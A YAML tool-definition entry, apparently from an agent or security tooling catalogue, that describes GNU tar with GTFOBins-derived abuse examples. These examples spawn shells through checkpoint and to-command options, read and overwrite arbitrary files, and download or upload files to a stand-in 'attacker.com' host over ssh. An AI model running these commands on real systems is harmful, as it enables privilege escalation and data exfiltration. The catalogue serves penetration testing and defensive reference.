---
id: archive-tar-tar
namespace: archive:tar:tar
name: tar
description: GNU tape archiver; can read/write files, transfer data, and spawn shells via checkpoint actions Can also download files, read arbitrary files, write to arbitrary files, spawn an interactive shell, upload files.
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- system.file.read
- system.file.write
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- tar
parameters: []
features: []
execution:
  template: tar
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files
  command: tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
- description: Read arbitrary files
  command: tar cf /dev/stdout /path/to/input-file -I 'tar xO'
- description: Write to arbitrary files
  command: 'echo DATA >/path/to/temp-file

    tar cf /path/to/temp-file.tar /path/to/temp-file

    tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@'
- description: Spawn an interactive shell
  command: tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
- description: Spawn an interactive shell
  command: tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
- description: Spawn an interactive shell
  command: 'echo ''/bin/sh 0<&1'' >/path/to/temp-file

    tar cf /path/to/temp-file.tar /path/to/temp-file

    tar xf /path/to/temp-file.tar --to-command /bin/sh'
- description: Upload files
  command: tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/tar/
techniques:
- collection
- exfiltration
- privilege-escalation
- execution
install:
- method: apt
  package_name: tar
  commands:
  - apt-get install -y tar
---


# tar

tar is a command-line utility. GNU tape archiver; can read/write files, transfer data, and spawn shells via checkpoint actions Can also download files, read arbitrary files, write to arbitrary files, spawn an interactive shell, upload files.
